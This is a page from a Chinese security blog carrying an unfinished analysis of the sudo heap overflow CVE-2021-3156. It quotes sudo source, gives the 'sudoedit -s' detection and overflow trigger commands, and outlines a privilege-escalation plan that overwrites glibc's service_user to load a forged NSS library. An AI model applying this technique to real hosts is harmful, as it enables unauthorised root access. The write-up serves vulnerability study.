<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32.ico">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16.ico">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"erkeai.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="reading, coding, travelling">
<meta property="og:type" content="website">
<meta property="og:title" content="hazel&#39;blog">
<meta property="og:url" content="https://erkeai.github.io/index.html">
<meta property="og:site_name" content="hazel&#39;blog">
<meta property="og:description" content="reading, coding, travelling">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="ZouFeIYu">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://erkeai.github.io/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>hazel'blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">hazel'blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">118</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">10</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">110</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/09/07/sample/CVE-2021-3156sudo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
      <meta itemprop="description" content="reading, coding, travelling">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="hazel'blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/07/sample/CVE-2021-3156sudo%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">CVE-2021-3156sudo提权漏洞分析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-09-07 00:00:00" itemprop="dateCreated datePublished" datetime="2022-09-07T00:00:00+08:00">2022-09-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2023-03-29 15:40:32" itemprop="dateModified" datetime="2023-03-29T15:40:32+08:00">2023-03-29</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/" itemprop="url" rel="index"><span itemprop="name">样本分析</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>6.4k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>从这个漏洞入手，一是为了更加熟悉linux，扩宽自己linux的知识面，二是想把学习的pwn知识实践操作一下。</p>
<h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>该漏洞成因主要是由于<code>sudo</code>在处理单个反斜杠结尾的命令，会出现逻辑上的错误，从而导致堆溢出。当<code>sudo</code>通过-s或-i命令行选项在shell模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用-s或 -i标志运行<code>sudoedit</code>时，实际上并未进行转义，从而可能导致缓冲区溢出。（后面分析原源代码会提到），只要存在<code>sudoers</code>文件（通常是 <code>/etc/sudoers</code>），攻击者就可以使用本地普通用户利用sudo获得系统root权限。</p>
<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>在非root权限下，运行<code>sudoedit -s /</code>，如果出现下图这样，说明系统受到该漏洞影响。</p>
<p><img src="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/typora/paper/image-20220907220817214.png" alt="image-20220907220817214"></p>
<h3 id="代码逻辑分析"><a href="#代码逻辑分析" class="headerlink" title="代码逻辑分析"></a>代码逻辑分析</h3><p>命令行模式下运行sudo，加上<code>-s</code>选项会设置<code>MODE_SHELL</code> flag；加上<code>-i</code>选项会设置<code>MODE_SHELL</code> flag 和 <code>MODE_LOGIN_SHELL</code> flag。sudo的<code>main()</code> 函数开头调用了<code>parse_args()</code>，<code>parse_args()</code> 会连接所有命令行参数。并给元字符加反斜杠来重写 <code>argv</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//parse_args.c   parse_args()</span></span><br><span class="line"> <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;    <span class="comment">//检查是否开启 MODE_SHELL</span></span><br><span class="line">    <span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">/* shell -c &quot;command&quot; */</span></span><br><span class="line">        <span class="keyword">char</span> *src, *dst;</span><br><span class="line">        <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line">        <span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">        sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (src = *av; *src != <span class="string">&#x27;\0&#x27;</span>; src++) &#123;</span><br><span class="line">            <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;-&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">            *dst++ = <span class="string">&#x27;\\&#x27;</span>;    <span class="comment">//添加反斜杠</span></span><br><span class="line">            *dst++ = *src;    <span class="comment">//原参数</span></span><br><span class="line">        &#125;</span><br><span class="line">        *dst++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">        dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">        *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>suduers.c</code>中的<code>sudoers_policy_main()</code>中调用了<code> set_cmnd()</code>函数,在 <code>set_cmnd()</code>函数中，首先根据参数使用 <code>strlen()</code>函数计算了参数的 <code>size</code>，再调用 <code>malloc()</code>函数分配了 <code>size</code>大小的堆空间 <code>user_args</code> 。随后判断是否开启了 <code>MODE_SHELL</code>，如果开启了将会 连接命令行参数并存入堆空间 <code>user_args</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// sudoers.c set_cmnd()    </span></span><br><span class="line">     <span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; </span><br><span class="line">... </span><br><span class="line">             <span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++) </span><br><span class="line">               size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>; </span><br><span class="line">             <span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123; </span><br><span class="line">... </span><br><span class="line">             &#125; </span><br><span class="line">             <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; </span><br><span class="line">... </span><br><span class="line">                 <span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;  <span class="comment">// 把命令行参数放入from里面</span></span><br><span class="line">                     <span class="keyword">while</span> (*from) &#123; </span><br><span class="line">                         <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>])) </span><br><span class="line">                             from++; </span><br><span class="line">                         *to++ = *from++;  <span class="comment">// 将输入的命令行参数拷贝到堆空间 user_args</span></span><br><span class="line">                     &#125; </span><br><span class="line">                     *to++ = <span class="string">&#x27; &#x27;</span>; </span><br><span class="line">                 &#125; </span><br><span class="line">... </span><br><span class="line">             &#125; </span><br><span class="line">... </span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>

<p>小总结一下，首先大概就是有两个流程，根据上面的分析，我们需要触发漏洞需要启用<code>MODE_SHELL</code>，但是如果启用了该标志，在第一个逻辑<code>parge_args()</code>中就会对所有参数进行转义，触发漏洞的<code> \</code>，将会被转义为 <code>\\</code>，这样就无法触发漏洞了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// parse_args() 换码代码</span></span><br><span class="line">     <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123; </span><br><span class="line"><span class="comment">// set_cmnd() 漏洞代码</span></span><br><span class="line">    <span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; </span><br><span class="line">... </span><br><span class="line">             <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br></pre></td></tr></table></figure>

<p>所以要触发漏洞就需要设置 <code>MODE_SHELL</code> 和 <code>MODE_EDIT</code>/<code>MODE_CHECK</code> ，但不设置 <code>MODE_RUN</code>，但是在<code>parge_args()</code>代码中，设置了<code>MODE_EDIT</code>/<code>MODE_CHECK</code>，<code>parse_args()</code>就会从<code>valid_flags</code>移除<code>MODE_SHELL</code>，如果此时还设置了<code>MODE_SHELL</code>就会报错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">                 <span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>: </span><br><span class="line">... </span><br><span class="line">                     mode = MODE_EDIT; </span><br><span class="line">                     sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>; </span><br><span class="line">                    valid_flags = MODE_NONINTERACTIVE; </span><br><span class="line">                     <span class="keyword">break</span>; </span><br><span class="line">... </span><br><span class="line">                 <span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>: </span><br><span class="line">... </span><br><span class="line">                     mode = MODE_LIST; </span><br><span class="line">                     valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST; </span><br><span class="line">                     <span class="keyword">break</span>; </span><br><span class="line">... </span><br><span class="line">     <span class="keyword">if</span> (argc &gt; <span class="number">0</span> &amp;&amp; mode == MODE_LIST) </span><br><span class="line">         mode = MODE_CHECK; </span><br><span class="line">... </span><br><span class="line">     <span class="keyword">if</span> ((flags &amp; valid_flags) != flags) </span><br><span class="line">         usage(<span class="number">1</span>); </span><br></pre></td></tr></table></figure>

<p>所以选择使用<code> sudoedit</code>。因为<code> sudoedit</code>还是会被软链接到使用<code> sudo</code>命令，但是在 <code>parse_args()</code>函数中会自动设置 <code>MODE_EDIT</code>和不会重置 <code>valid_flags</code>，则 <code>MODE_SHELL</code>仍然在 <code>valid_flags</code>中 ，而且不会设置 <code>MODE_RUN</code>,这样就能跳过 <code>parse_args()</code>函数中转义参数的部分，同时满足 <code>set_cmnd()</code>函数中漏洞触发的部分。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//parse_args.c parse_args()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_VALID_FLAGS     (MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|\ MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL) </span></span><br><span class="line">... </span><br><span class="line"><span class="keyword">int</span> valid_flags = DEFAULT_VALID_FLAGS;     <span class="comment">//valid_flags默认参数包含MODE_SHELL，不包含MODE_RUN</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">/* First, check to see if we were invoked as &quot;sudoedit&quot;. */</span></span><br><span class="line">    proglen = <span class="built_in">strlen</span>(progname);</span><br><span class="line">    <span class="keyword">if</span> (proglen &gt; <span class="number">4</span> &amp;&amp; <span class="built_in">strcmp</span>(progname + proglen - <span class="number">4</span>, <span class="string">&quot;edit&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">    progname = <span class="string">&quot;sudoedit&quot;</span>;</span><br><span class="line">    mode = MODE_EDIT;    <span class="comment">//设置MODE_EDIT</span></span><br><span class="line">    sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以，只要执行<code>sudoedit -s \</code>，就能同时设置<code>MODE_EDIT</code>和<code>MODE_SHELL</code>，但不设置<code>MODE_RUN</code>。跳过<code>parse_args()</code>中的换码代码，直接执行漏洞代码<code>set_cmnd()</code>，溢出<code>user_args</code>堆缓冲区。</p>
<h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Alloc and build up user_args. */</span></span><br><span class="line"><span class="keyword">for</span> (size = <span class="number">0</span>, av = NewArgv + <span class="number">1</span>; *av; av++)</span><br><span class="line">size += <span class="built_in">strlen</span>(*av) + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (size == <span class="number">0</span> || (user_args = <span class="built_in">malloc</span>(size)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">    <span class="keyword">while</span> (*from) &#123;</span><br><span class="line">    <span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))  <span class="comment">// 关键逻辑！！！</span></span><br><span class="line">        from++;</span><br><span class="line">    *to++ = *from++;</span><br><span class="line">    &#125;</span><br><span class="line">    *to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">*--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>还是上面的<code>set_cmnd</code>函数，如果输入指令是</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudoedit -s &#x27;\&#x27; 112233445566</span><br></pre></td></tr></table></figure>

<p>那么进入该函数时，<code>NewArgv</code>的结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">NewArgv[<span class="number">0</span>]: sudoedit</span><br><span class="line">NewArgv[<span class="number">1</span>]: \</span><br><span class="line">NewArgv[<span class="number">2</span>]: <span class="number">112233445566</span></span><br></pre></td></tr></table></figure>

<p>首先会计算 <code>NewArgv [1]、[2]</code> 两个参数的长度 <code>2 + 13 = 15</code> .</p>
<p>因此<code>user_args</code>分配的内存大小为 <strong><code>15</code> 字节</strong>。</p>
<p>然后会把 <code>NewArgv[1]、[2] </code> 的数据拷贝到<code>user_args</code>里面。</p>
<p>拷贝过程中如果 <code>from[0]</code> 为 <code>\</code>，且 <code>from[1]</code> 不是空格就会<code>from++</code>。所以在处理<code>NewArgv[1]</code>时，<code>from[0]</code> 就是 <code>\</code> ，<code>from[1]</code> 为 <code>\x00</code> ，会通过这个判断让 <code>from++</code> ，然后后面会再次<code>from++.</code></p>
<p>之后from就指向了<code>NewArgv[1]</code>字符串<code>\x00</code>后面一个字符的位置，后面紧跟着的是<code>NewArgv[2]</code>，所以此时 from 执行的就是 <code>NewArgv[2]</code> 的开头</p>
<p>从而会<strong>再次进入while循环把<code>NewArgv[2]</code>拷贝到user_args</strong></p>
<p>然后处理<code>NewArgv[2]</code>会<strong>再次把<code>NewArgv[2]</code>拷贝到user_args</strong></p>
<p>因此最终结果就是 <code>NewArgv[2]</code> 被拷贝了两次，实际的写入数据长度为<strong>26字节</strong></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ol>
<li><code>user_args</code>堆缓冲区的size可控（根据前面<code>set_cmnd()</code>就是命令行参数合并后的长度）；</li>
<li>能分别控制size和溢出的内容（第一段命令行参数后紧跟第二段命令行参数，第二段命令行参数不包含在size中）；</li>
<li>可以写null字节到<code>user_args</code>（每个以单反斜杠结尾的命令行参数或环境变量，都能往<code>user_args</code>写1个null字节）</li>
</ol>
<p>最后的提权是通过堆溢出覆盖<code>nss_load_library</code>函数加载so的时候需要用到的结构体<code>service_user</code>，覆盖此结构体中的so名字符串，这样就可以让程序加载我们指定的so文件，从而完成任意代码执行。</p>
<h4 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h4><p>溢出后覆盖<code>service_user</code>结构。该结构出现在libc的<code>nss_load_library()</code>函数中，用于加载动态链接库。如果能覆盖<code>service_user-&gt;name</code>，就能指定加载我们伪造的库，利用root权限运行非root权限的库。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. service_user 结构</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="comment">/* And the link to the next entry.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">service_user</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* Action according to result.  */</span></span><br><span class="line">  lookup_actions actions[<span class="number">5</span>];</span><br><span class="line">  <span class="comment">/* Link to the underlying library object.  */</span></span><br><span class="line">  service_library *library;</span><br><span class="line">  <span class="comment">/* Collection of known functions.  */</span></span><br><span class="line">  <span class="keyword">void</span> *known;</span><br><span class="line">  <span class="comment">/* Name of the service (`files&#x27;, `dns&#x27;, `nis&#x27;, ...).  */</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">0</span>];</span><br><span class="line">&#125; service_user;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. nss_load_library() 函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nss_load_library</span> <span class="params">(service_user *ni)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">static</span> name_database default_table;</span><br><span class="line">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table, ni-&gt;name);<span class="comment">// （1）设置 ni-&gt;library</span></span><br><span class="line">                     </span><br><span class="line">      <span class="keyword">if</span> (ni-&gt;library == <span class="literal">NULL</span>)</span><br><span class="line">    		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ni-&gt;library-&gt;lib_handle == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Load the shared library.  */</span></span><br><span class="line">      <span class="keyword">size_t</span> shlen = (<span class="number">7</span> + <span class="built_in">strlen</span> (ni-&gt;name) + <span class="number">3</span></span><br><span class="line">              + <span class="built_in">strlen</span> (__nss_shlib_revision) + <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">int</span> saved_errno = errno;</span><br><span class="line">      <span class="keyword">char</span> shlib_name[shlen];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Construct shared object name.  */</span></span><br><span class="line">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,   <span class="comment">// （2）伪造的库文件名必须是 libnss_xxx.so</span></span><br><span class="line">                          <span class="string">&quot;libnss_&quot;</span>),</span><br><span class="line">                    ni-&gt;name),</span><br><span class="line">              <span class="string">&quot;.so&quot;</span>),</span><br><span class="line">        __nss_shlib_revision);</span><br><span class="line"></span><br><span class="line">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name); <span class="comment">// （3）加载目标库</span></span><br><span class="line">      <span class="comment">//continue long long function</span></span><br></pre></td></tr></table></figure>

<p>根据上面的代码，我们知道需要将 <code>ni-&gt;library</code>覆盖为 <code>null</code>，将 <code>ni-&gt;name</code>覆盖我们自己伪造的库名字，且伪造的库文件名必须是<code> libnss_xxx.so</code></p>
<p>—待更新</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://erkeai.github.io/2022/08/26/%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A0/VMProtect%E5%88%86%E6%9E%90/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://blog-1257910714.cos.ap-chengdu.myqcloud.com/images%2FhdImg_f7fb2f283d6fd693d9c2444fb73eaf4715853190130.jpg">
      <meta itemprop="name" content="ZouFeIYu">
